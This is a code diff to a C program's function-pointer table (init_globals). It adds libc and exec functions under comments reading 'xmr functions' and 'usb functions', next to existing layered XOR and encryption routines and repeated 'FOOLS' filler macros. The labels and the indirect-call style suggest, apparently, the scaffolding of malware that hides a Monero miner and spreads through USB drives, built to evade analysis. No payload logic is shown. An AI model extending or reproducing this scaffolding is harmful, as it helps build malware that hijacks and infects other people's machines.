@@ -18,6 +18,7 @@
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <libgen.h>
 
 #include "main/globals.h"
 #include "main/utils.h"
@@ -59,8 +60,11 @@ void init_globals(Globals *global){
     global->strlen=&strlen;
     global->strcmp=&strcmp;
     global->strstr=&strstr;
+    global->strcpy=&strcpy;
     global->strncpy=&strncpy;
     global->sscanf=&sscanf;
+    global->strtok=&strtok;
+    global->strcat=&strcat;
 
     FOOLS;
     // memory
@@ -79,15 +83,20 @@ void init_globals(Globals *global){
     // files
     global->realpath=&realpath;
     global->fopen=&fopen;
+    global->access=&access;
     global->fread=&fread;
     global->fseek=&fseek;
     global->ftell=&ftell;
     global->fclose=&fclose;
     global->fwrite=&fwrite;
     global->rewind=&rewind;
+    global->open=&open;
     global->write=&write;
     global->close=&close;
     global->mkdir=&mkdir;
+    global->opendir=&opendir;
+    global->readdir=&readdir;
+    global->closedir=&closedir;
 
 
     // errno
@@ -96,6 +105,7 @@ void init_globals(Globals *global){
     FOOLS;
     // heap
     global->malloc=&malloc;
+    global->realloc=&realloc;
     global->free=&free;
 
     // network
@@ -143,6 +153,28 @@ void init_globals(Globals *global){
     global->xor_memory_layered=&xor_memory_layered;
     global->encrypt_layered=&encrypt_layered;
     global->decrypt_layered=&decrypt_layered;
+
+    FOOLS;
+    // xmr functions
+    global->popen=&popen;
+    global->pclose=&pclose;
+    global->fgets=&fgets;
+    global->strncmp=&strncmp;
+    global->ferror=&ferror;
+    global->remove=&remove;
+    global->dirname=&dirname;
+    global->strdup=&strdup;
+    global->system=&system;
+    global->chmod=&chmod;
+    global->execlp=&execlp;
+
+    FOOLS;
+    // usb functions
+    global->lstat=&lstat;
+    global->stat=&stat;
+    global->atoi=&atoi;
+    global->__strtok_r=&__strtok_r;
+    global->execl=&execl;
 
     FOOLS;
     // global values
